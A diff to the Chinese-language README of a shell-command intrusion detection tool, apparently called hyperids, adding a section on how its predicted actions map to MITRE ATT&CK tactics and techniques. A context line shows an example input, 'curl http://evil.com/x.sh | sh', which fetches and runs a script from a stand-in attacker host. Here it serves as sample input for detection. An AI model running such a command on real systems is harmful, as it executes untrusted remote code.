@@ -42,6 +42,22 @@ hyperids 'curl http://evil.com/x.sh | sh'
 
 详见 `deploy/c_runtime/README.md` 与 `docs/TRAINING.md`。
 
+## MITRE ATT&CK 覆盖
+
+MITRE tactic/technique **不预测**，由 28 个 action 经 `hyperids.schema.derive_attck()` 规则表确定性推导。
+
+| 层 | 覆盖 | 说明 |
+|---|---|---|
+| tactic | **12 / 14（85.7%）** | 缺 reconnaissance / resource_development（攻击前准备阶段，命令文本外行为） |
+| technique | **25 个** | 精选的「shell 命令可观测」子集（反弹 shell→T1059、挖矿→T1496、勒索→T1486 …） |
+
+覆盖的 12 个 tactic：initial_access、execution、persistence、privilege_escalation、
+defense_evasion、credential_access、discovery、lateral_movement、collection、
+command_and_control、exfiltration、impact。
+
+> 定位是「从命令推导最可能的 tactic/technique」，非全量 ATT&CK 覆盖
+> （全量 200+ technique 大量是钓鱼/供应链/云原生等与单条 shell 命令无关的技术）。
+
 ## 模型指标
 
 ### 内测（test 5,978）
